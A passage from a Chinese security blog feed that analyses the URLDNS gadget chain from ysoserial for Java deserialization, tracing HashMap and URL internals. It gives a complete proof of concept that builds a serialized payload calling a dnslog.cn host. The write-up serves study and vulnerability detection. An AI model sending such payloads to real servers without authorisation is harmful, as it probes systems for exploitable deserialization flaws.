class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210405200638.png"></p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p><code>URLDNS</code> 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><p>ysoserial中列出的Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>原理：</p><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><p>HashMap#readObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="comment">// 读取传入的输入流，对传入的序列化数据进行反序列化</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关注<code>putVal</code>方法，<code>putVal</code>是往HashMap中放入键值对的方法，这里调用了<code>hash</code>方法来处理key，跟进<code>hash</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又调用了<code>key.hashcode</code>方法，而key此时是我们传入的 <code>java.net.URL</code> 对象，那么跟进到这个类的hashCode()方法看下</p><p>URL#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;  <span class="comment">// synchronized 关键字修饰的方法为同步方法。当synchronized方法执行完或发生异常时，会自动释放锁。</span></span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当hashCode字段等于-1时会进行<code>handler.hashCode(this)</code>计算，跟进handler发现，定义是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">// transient 关键字，修饰Java序列化对象时，不需要序列化的属性</span></span><br></pre></td></tr></table></figure><p>那么跟进<code>java.net.URLStreamHandler#hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the protocol part.</span></span><br><span class="line">       String protocol = u.getProtocol();</span><br><span class="line">       <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">           h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the host part.</span></span><br><span class="line">       InetAddress addr = getHostAddress(u);</span><br><span class="line">       <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">           h += addr.hashCode();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           String host = u.getHost();</span><br><span class="line">           <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">               h += host.toLowerCase().hashCode();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the file part.</span></span><br><span class="line">       String file = u.getFile();</span><br><span class="line">       <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">           h += file.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the port part.</span></span><br><span class="line">       <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">           h += getDefaultPort();</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           h += u.getPort();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the ref part.</span></span><br><span class="line">       String ref = u.getRef();</span><br><span class="line">       <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">           h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>u 是我们传入的url，在调用<code>getHostAddress</code>方法时，会进行dns查询。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003342.png"></p><p>这是正面分析的流程。</p><p>回到开始的Hashmap#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>key 是从<code>K key = (K) s.readObject();</code>    这段代码，也是就是readObject中得到的，说明之前在writeObject会写入key</p><p>Hashmap#writeObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后调用了<code>internalWriteEntries</code> 方法，跟进一下具体实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Called only from writeObject, to ensure compatible ordering.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">                s.writeObject(e.key);</span><br><span class="line">                s.writeObject(e.value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。</p><p>想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了避免这一次的dns查询（防止本机与目标机器发送的dns请求混淆），ysoserial 中使用<code>SilentURLStreamHandler</code>    方法，直接返回null，并不会像<code>URLStreamHandler</code>那样去调用一系列方法最终到<code>getByName</code>，因此也就不会触发dns查询了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了这种方法还可以在本地生成payload时，将hashCode设置不为<code>-1</code>的其他值。</p><p>URL#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果不为<code>-1</code>，那么直接返回了。也就不会进行<code>handler.hashCode(this);</code>这一步计算hashcode，也就没有之后的<code>getByName</code>，获取dns查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The URLStreamHandler for this URL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Our hash code.</span></span><br><span class="line"><span class="comment"> * @serial</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>而hashCode是通过<code>private</code>关键字进行修饰的（本类中可使用），可以通过反射来修改hashCode的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// 反射获取URL类中的hashCode</span></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">// 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完整的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">// 绕过Java语言权限控制检查的权限</span></span><br><span class="line">        f.set(url,<span class="number">123</span>); <span class="comment">// 设置hashcode的值为-1的其他任何数字</span></span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">// 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>); <span class="comment">// 将hashcode重新设置为-1，确保在反序列化成功触发</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来调试下 ysoserial中的 URLDNS 模块，设置debug参数：</p><p><code>URLDNS &quot;http://7mczz6.dnslog.cn&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003414.png"></p><p>直接debug报错：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003427.png"></p><p>改一下Project 和 Moudles中的 <code>Project language level</code> ，其实就是所有都设置成一样的，包括pom.xml,实在不行，重新 <code>git pull</code> 重新导入idea 也能解决</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003532.png"></p><p>下断点进行单步调试，最后看这里</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003557.png"></p><p>方法之间的调用也很清楚的展示了出来。</p><p>借用一位师傅总结的 gadgets:</p><p>JDK1.8下的调用路线：</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>而在jdk1.7u80环境下调用路线会有一处不同，但是大同小异：</p><ol><li>HashMap-&gt;readObject()</li><li><strong>HashMap-&gt;putForCreate()</strong></li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>之后相同</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>感谢：</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://www.t00ls.net/articles-50486.html">https://www.t00ls.net/articles-50486.html</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524">https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524</a></p><p><a href="https://xz.aliyun.com/t/6787">https://xz.aliyun.com/t/6787</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512">https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512</a></p><p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><p><a href="https://paper.seebug.org/1242/#urldns">https://paper.seebug.org/1242/#urldns</a></p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54">https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54</a></p><p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p><p><a href="https://medium.com/@m01e/ysoserial-urldns%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-33c80154f56f">https://medium.com/@m01e/ysoserial-urldns%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-33c80154f56f</a></p><p><a href="https://crossoverjie.top/2018/01/14/Synchronize/">https://crossoverjie.top/2018/01/14/Synchronize/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;首发于阿里云先知社区，&lt;a href=&quot;https://xz.aliyun.com/t/9417&quot;&gt;https://xz.aliyun.com/t/9417&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java反序列化" scheme="https://hack-for.fun/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透：跨域攻击分析及防范</title>
    <link href="https://hack-for.fun/593b.html"/>
    <id>https://hack-for.fun/593b.html</id>
    <published>2021-03-07T12:20:33.000Z</published>
    <updated>2021-03-10T16:13:12.770Z</updated>
    
